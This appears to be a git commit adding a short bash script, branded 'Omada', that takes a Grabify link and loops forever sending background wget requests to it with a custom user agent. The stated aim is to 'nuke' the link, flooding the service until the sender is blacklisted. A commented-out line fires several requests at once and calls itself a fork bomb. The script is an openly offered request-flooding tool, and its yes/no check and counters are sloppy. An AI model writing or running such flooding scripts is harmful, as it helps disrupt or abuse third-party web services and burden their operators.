5f638499e9f0250f50cc9a186f145ad137177fb8
Kilo <145521434+kkilobyte@users.noreply.github.com>
2023-11-19 15:39:59 -0800

    Add files via upload

---
+++ main.sh
@@ -0,0 +1,54 @@
+#!/bin/bash
+
+echo '$$$$$$\                                $$\           '
+echo '$$  __$$\                               $$ |          '
+echo '$$ /  $$ |$$$$$$\$$$$\   $$$$$$\   $$$$$$$ | $$$$$$\  '
+echo '$$ |  $$ |$$  _$$  _$$\  \____$$\ $$  __$$ | \____$$\ '
+echo '$$ |  $$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ | $$$$$$$ |'
+echo '$$ |  $$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |$$  __$$ |'
+echo ' $$$$$$  |$$ | $$ | $$ |\$$$$$$$ |\$$$$$$$ |\$$$$$$$ |'
+echo ' \______/ \__| \__| \__| \_______| \_______| \_______|'
+
+
+
+# Ask user for the link they will use to get blacklisted
+echo What link do you want to nuke?
+echo Make sure it is http\:\/\/ instead of https\:\/\/
+read -p 'LINK': LINK
+
+# Idiot protection
+echo "Are you absolutely sure you want to run this? this will send over 7 pages of requests to the grabify link before blacklisting you."
+read -p 'Y/N': INPUT
+echo "User input is $INPUT"
+if [ $INPUT = N ]
+then
+echo Goodbye.
+exit
+fi
+if [ $INPUT = N ]
+then
+echo Goodbye.
+exit
+fi
+
+
+# Fucker upper
+count=0
+for (( ; ; ))
+do
+# literal fucking fork bomb LMAO
+#wget $LINK -o /dev/null --user-agent="https://omada.cafe on top!" & wget $LINK -o /dev/null --user-agent="https://omada.cafe on top!" & wget $LINK -o /dev/null --user-agent="https://omada.cafe on top!" & wget $LINK -o /dev/null --user-agent="https://omada.cafe on top!" & wget $LINK -o /dev/null --user-agent="https://omada.cafe on top!" &
+wget $LINK -O /dev/null --user-agent="https://omada.cafe on top!" &
+(( COUNT++ ))
+echo "Omada has sent $COUNT requests up grabify's ass!"
+
+# ANTI-OOM
+(( REQ++ ))
+while [ $REQ -ge 10 ]
+do
+#killall wget
+sleep 1
+REQ=0
+done
+
+done
